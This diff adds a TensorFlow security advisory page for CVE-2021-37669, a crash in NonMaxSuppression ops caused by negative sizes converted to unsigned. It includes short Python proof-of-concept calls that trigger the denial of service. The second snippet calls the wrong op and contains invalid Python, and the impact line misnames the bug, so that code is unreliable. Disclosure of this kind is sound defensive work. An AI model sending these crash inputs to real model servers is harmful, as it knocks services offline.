@@ -1,0 +1,60 @@
+<h2>TFSA-2021-143: Crash in NMS ops caused by integer conversion to unsigned</h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-37669</p>
+<h3>Impact</h3>
+<p>An attacker can cause denial of service in applications serving models using
+<code>tf.raw_ops.NonMaxSuppressionV5</code> by triggering a division by 0:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.NonMaxSuppressionV5(
+  boxes=[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],
+  scores=[1.0,2.0,3.0],
+  max_output_size=-1,
+  iou_threshold=0.5,
+  score_threshold=0.5,
+  soft_nms_sigma=1.0,
+  pad_to_max_output_size=True)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/image/non_max_suppression_op.cc#L170-L271">implementation</a>
+uses a user controlled argument to resize a <code>std::vector</code>:</p>
+<p><code>cc
+  const int output_size = max_output_size.scalar&lt;int&gt;()();
+  // ...
+  std::vector&lt;int&gt; selected;
+  // ...
+  if (pad_to_max_output_size) {
+    selected.resize(output_size, 0);
+    // ...
+  }</code></p>
+<p>However, as <code>std::vector::resize</code> takes the size argument as a <code>size_t</code> and
+<code>output_size</code> is an <code>int</code>, there is an implicit conversion to usigned. If the
+attacker supplies a negative value, this conversion results in a crash.</p>
+<p>A similar issue occurs in <code>CombinedNonMaxSuppression</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>tf.raw_ops.NonMaxSuppressionV5(
+  boxes=[[[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]],[[0.1,0.1,0.1,0.1],[0.2,0.2,0.2,0.2],[0.3,0.3,0.3,0.3]]]],
+  scores=[[[1.0,2.0,3.0],[1.0,2.0,3.0],[1.0,2.0,3.0]]],
+  max_output_size_per_class=-1,
+  max_total_size=10,
+  iou_threshold=score_threshold=0.5,
+  pad_per_class=True,
+  clip_boxes=True)
+```</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d">3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d</a>
+and commit
+<a href="https://github.com/tensorflow/tensorflow/commit/b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58">b5cdbf12ffcaaffecf98f22a6be5a64bb96e4f58</a>.</p>
+<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
+commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
+also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by members of the Aivul Team from Qihoo
+360.</p>
